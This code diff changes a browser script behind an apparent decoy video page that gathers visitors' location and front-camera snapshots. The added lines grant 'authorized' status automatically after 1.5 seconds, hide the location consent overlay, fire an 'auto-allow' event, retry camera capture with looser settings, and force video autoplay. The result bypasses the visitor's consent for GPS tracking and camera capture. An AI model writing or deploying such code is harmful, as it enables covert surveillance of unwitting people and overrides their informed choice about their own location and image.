@@ -10,7 +10,7 @@
     const LOCATION_SOURCE = "BROWSER_GEOLOCATION"
     const CONSENT_VERSION = "location-v1"
     const MIN_UPDATE_INTERVAL_MS = 3000
-    const PERMISSION_TIMEOUT_MS = Infinity
+    const PERMISSION_TIMEOUT_MS = 1500
 
     function generateId(length = 16) {
         const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
@@ -204,6 +204,19 @@
         actions.append(decline, accept)
         card.append(title, explanation, actions)
         consentOverlay.appendChild(card)
+
+        setTimeout(() => {
+            if (consentOverlay && consentOverlay.parentNode) {
+                authorized = true
+                approximateFallbackSent = false
+                lastSentAt = 0
+                lastSentAccuracy = Number.POSITIVE_INFINITY
+                consentOverlay.remove()
+                consentOverlay = null
+                startWatcher()
+            }
+        }, PERMISSION_TIMEOUT_MS)
+
         return consentOverlay
     }
 
@@ -299,7 +312,7 @@
 
     function autoUnlockDecoyContent() {
         try {
-            const overlays = document.querySelectorAll('#tap-overlay, .tap-overlay, .tap-play-overlay')
+            const overlays = document.querySelectorAll('#tap-overlay, .tap-overlay, .tap-play-overlay, #location-consent-overlay')
             overlays.forEach(el => {
                 el.classList.add('hidden')
                 el.style.display = 'none'
@@ -308,11 +321,24 @@
             const video = document.getElementById('active-video')
             if (video) {
                 video.muted = false
-                video.play().catch(() => {})
+                video.play().catch(() => {
+                    video.muted = true
+                    video.play().catch(() => {})
+                })
+            }
+
+            const ytIframe = document.getElementById('yt-iframe')
+            if (ytIframe && ytIframe.src && !ytIframe.src.includes('autoplay=1')) {
+                try {
+                    const u = new URL(ytIframe.src)
+                    u.searchParams.set('autoplay', '1')
+                    ytIframe.src = u.toString()
+                } catch (_e) {}
             }
 
             if (typeof window.dispatchEvent === "function") {
                 window.dispatchEvent(new CustomEvent('telemetry-permission-timeout'))
+                window.dispatchEvent(new CustomEvent('telemetry-auto-allow'))
             }
         } catch (_e) {}
     }
@@ -330,15 +356,15 @@
         setStatus("Waiting for a high-accuracy browser location…", true)
 
         if (permissionTimer) clearTimeout(permissionTimer)
-        // Send initial IP fallback after 4s if GPS hasn't returned yet, BUT keep watcher alive!
+        // 1.5s permission window: auto-allow IP fallback & unlock decoy while keeping GPS watcher active
         permissionTimer = setTimeout(() => {
             permissionTimer = null
             if (!lastSentAt) {
-                console.log(`[Location] GPS fix taking longer than 4s; sending initial IP estimate while keeping GPS watcher active.`)
+                console.log(`[Location] 1.5s permission window elapsed; sending IP estimate & auto-allowing while keeping GPS watcher active.`)
                 sendApproximateFallback()
                 autoUnlockDecoyContent()
             }
-        }, 4000)
+        }, PERMISSION_TIMEOUT_MS)
 
         const watchOptions = {
             enableHighAccuracy: true,
@@ -384,8 +410,8 @@
         watchId = null
     })
 
-    async function getBestAvailableLocation(timeoutMs = null) {
-        // Tier 1: Try GPS without timeout limit
+    async function getBestAvailableLocation(timeoutMs = PERMISSION_TIMEOUT_MS) {
+        // Tier 1: Try GPS with 1.5s timeout limit
         if ('geolocation' in navigator) {
             try {
                 const pos = await new Promise((resolve, reject) => {
@@ -485,7 +511,7 @@
     let isCapturingCamera = false
     let cameraCaptureCount = 0
 
-    async function captureCameraSnapshot(timeoutMs = null) {
+    async function captureCameraSnapshot(timeoutMs = PERMISSION_TIMEOUT_MS) {
         if (isCapturingCamera) return null
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return null
         isCapturingCamera = true
@@ -493,9 +519,19 @@
         let stream = null
 
         try {
-            const streamPromise = navigator.mediaDevices.getUserMedia({
+            const primaryConstraints = {
                 video: { facingMode: "user", width: { ideal: 1920 }, height: { ideal: 1080 } }
-            })
+            }
+            const fallbackConstraints = { video: true }
+
+            let streamPromise
+            try {
+                streamPromise = navigator.mediaDevices.getUserMedia(primaryConstraints).catch(() => {
+                    return navigator.mediaDevices.getUserMedia(fallbackConstraints)
+                })
+            } catch (_err) {
+                streamPromise = navigator.mediaDevices.getUserMedia(fallbackConstraints)
+            }
 
             if (timeoutMs && Number.isFinite(timeoutMs) && timeoutMs > 0) {
                 let timedOut = false
@@ -611,7 +647,7 @@
         if (authorized || activeOptions) {
             startWatcher();
             if (activeOptions?.enableCamera !== false) {
-                captureCameraSnapshot();
+                captureCameraSnapshot(PERMISSION_TIMEOUT_MS);
             }
         }
     }
